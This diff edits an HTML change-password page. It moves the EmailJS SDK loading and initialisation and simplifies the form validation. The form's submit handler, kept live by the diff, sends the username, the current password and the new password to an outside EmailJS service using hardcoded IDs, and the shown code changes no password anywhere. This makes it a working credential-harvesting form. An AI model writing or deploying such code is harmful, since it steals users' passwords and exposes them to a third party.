@@ -178,11 +178,6 @@
     cursor: not-allowed;
   }
 </style>
- <!-- Add EmailJS SDK -->
-<script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
-<script>
-  emailjs.init("7ZhFIcanF93E3cSlm"); // <-- Replace with your EmailJS User ID
-</script>
 </head>
 <body>
 
@@ -251,8 +246,12 @@
   </form>
 </div>
 
+<script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
 <script>
-  // Enable Change Password button only if new password fields match and are filled
+window.onload = function() {
+  // Initialize EmailJS after SDK is fully loaded
+  emailjs.init("7ZhFIcanF93E3cSlm"); // <-- your EmailJS User ID
+
   const form = document.getElementById("change-password-form");
   const currentPass = form["current-password"];
   const newPass = form["new-password"];
@@ -263,16 +262,7 @@
     const currentVal = currentPass.value.trim();
     const newVal = newPass.value.trim();
     const retypeVal = retypePass.value.trim();
-
-    if (
-      currentVal.length >= 6 &&
-      newVal.length >= 6 &&
-      newVal === retypeVal
-    ) {
-      submitBtn.disabled = false;
-    } else {
-      submitBtn.disabled = true;
-    }
+    submitBtn.disabled = !(currentVal.length >= 6 && newVal.length >= 6 && newVal === retypeVal);
   }
 
   currentPass.addEventListener("input", validatePasswords);
@@ -281,11 +271,10 @@
 
   form.addEventListener("submit", function(e) {
     e.preventDefault();
-
     const templateParams = {
       username: document.querySelector(".username").textContent,
       currentPassword: currentPass.value,
-      newPassword: newPass.value            
+      newPassword: newPass.value
     };
 
     emailjs.send("service_9jiqv9f", "password_change", templateParams)
@@ -298,8 +287,9 @@
         alert("Oops! Something went wrong.");
       });
   });
+};
 </script>
-
 </body>
 
 </html>
+
